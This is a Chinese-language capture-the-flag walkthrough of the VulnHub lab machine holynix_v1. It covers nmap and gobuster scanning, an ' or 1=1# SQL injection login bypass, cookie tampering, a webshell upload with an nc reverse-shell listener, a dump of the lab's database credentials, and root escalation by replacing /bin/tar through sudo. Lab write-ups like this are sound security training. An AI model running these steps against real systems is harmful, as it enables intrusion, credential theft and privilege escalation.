# holynix_v1
平台：vulnhub
难度：简单

### nmap扫描

**主机发现：**
```
sudo nmap -sn 192.168.162.0/24 --min-rate 10000

Nmap scan report for 192.168.162.1 (192.168.162.1)
Host is up (0.0026s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.162.2 (192.168.162.2)
Host is up (0.0014s latency).
MAC Address: 00:50:56:FA:F4:E6 (VMware)
Nmap scan report for 192.168.162.138 (192.168.162.138)
Host is up (0.00050s latency).
MAC Address: 00:0C:29:BC:05:DE (VMware)
Nmap scan report for 192.168.162.254 (192.168.162.254)
Host is up (0.00047s latency).
MAC Address: 00:50:56:E3:0E:07 (VMware)
Nmap scan report for 192.168.162.135 (192.168.162.135)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 0.55 seconds
```
新的IP是192.168.162.138，是靶机的IP。

**基本端口扫描：**
```
sudo nmap -Pn --min-rate 10000 192.168.162.138

Host is up (0.025s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:BC:05:DE (VMware)
```

**详细扫描：**
```
sudo nmap -Pn -p 80 192.168.162.138 -sC -sV -O

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:BC:05:DE (VMware)

OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:linksys:rv042 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:2.6.28 cpe:/h:nokia:n900 cpe:/o:google:android:4.0.4 cpe:/h:iptime:pro_54g cpe:/h:linksys:wrv54g
Aggressive OS guesses: Linux 2.6.24 - 2.6.25 (98%), Linux 2.6.35 (95%), Linux 2.6.22 (SPARC) (94%), Linux 2.6.18 - 2.6.24 (93%), Linksys RV042 router (93%), Linux 2.6.9 - 2.6.33 (93%), Linux 4.4 (92%), Nokia N900 mobile phone (Linux 2.6.28) (92%), Linux 2.6.22 (embedded, ARM) (92%), Linux 2.6.22 - 2.6.23 (92%)
```




### gobuster扫描

使用一般字典，30个线程，快速扫一遍。
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.162.138/ -t 30

/index                (Status: 200) [Size: 776]
/login                (Status: 200) [Size: 342]
/misc                 (Status: 301) [Size: 357] [--> http://192.168.162.138/misc/]
/header               (Status: 200) [Size: 604]
/footer               (Status: 200) [Size: 63]
/upload               (Status: 301) [Size: 359] [--> http://192.168.162.138/upload/]
/img                  (Status: 301) [Size: 356] [--> http://192.168.162.138/img/]
/home                 (Status: 200) [Size: 109]
/transfer             (Status: 200) [Size: 44]
/ssp                  (Status: 301) [Size: 356] [--> http://192.168.162.138/ssp/]
/messageboard         (Status: 200) [Size: 249]
/calender             (Status: 200) [Size: 247]
/server-status        (Status: 403) [Size: 336]
```
最后发现爆破出来的好多目录都没用。-_-

开头是一个的路的界面可以使用万能后台密码登录：https://ctf-wiki.org/web/sqli/
`username:admin`
`password:' or 1=1#`

然后可以看到我们现在的用户是`alamo`，在upload的地方有上传文件的地方，但是没有上传文件的权限，检查一下cookie， 然后发现cookie的值为1，改为2用户变为`etenenbaum`，应该可以上传webshell了。
不过这个地方不能直接上传，需要把文件压缩后再上传：
```bash
tar -zcvf shell.tar.gz webshell.php
```
使用nc监听：
```bash
nc -lnvp 1234
```
弹反shell后先使用python稳定shell:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```


在/var/apache2文件夹下面有config.inc的文件，内容为：
```php
<?php
$dbhost = 'localhost';
$dbuser = 'root';
$dbpass = 'mY5qLr007p@S5w0rD';
$dbname = 'creds';
?>
```
登陆一下mysql试试。
```bash
mysql -u root -p
```
数据库creds中accounts的内容：
```
+-----+------------+--------------------+--------+
| cid | username   | password           | upload |
+-----+------------+--------------------+--------+
|   1 | alamo      | Ih@cK3dM1cR05oF7   | 0      | 
|   2 | etenenbaum | P3n7@g0n0wN3d      | 1      | 
|   3 | gmckinnon  | d15cL0suR3Pr0J3c7  | 1      | 
|   4 | hreiser    | Ik1Ll3dNiN@r315er  | 1      | 
|   5 | jdraper    | p1@yIngW17hPh0n35  | 1      | 
|   6 | jjames     | @rR35t3D@716       | 1      | 
|   7 | jljohansen | m@k1nGb0o7L3g5     | 1      | 
|   8 | kpoulsen   | wH@7ar37H3Fed5D01n | 1      | 
|   9 | ltorvalds  | f@7H3r0FL1nUX      | 0      | 
|  10 | mrbutler   | n@5aHaSw0rM5       | 1      | 
|  11 | rtmorris   | Myd@d51N7h3NSA     | 1      | 
+-----+------------+--------------------+--------+
```

### 提权

**sudo -l:**
```
User www-data may run the following commands on this host:
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /bin/chgrp
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /bin/mv
```
将 /bin/bash 文件复制到 /tmp 文件夹
`cp /bin/bash .`

更改文件 /tmp/bash 的所有权，以便从此 root 成为所有者
`sudo chown root:root /tmp/bash`

将现有的 /bin/tar 文件备份到 bin/tar.bak
`sudo mv /bin/tar /bin/tar.bak`

现在将 /tmp/bash 文件移动到 /bin/tar
`sudo mv /tmp/bash /bin/tar`

执行命令 /bin/tar（理想情况下运行 /bin/bash）
`sudo /bin/tar`

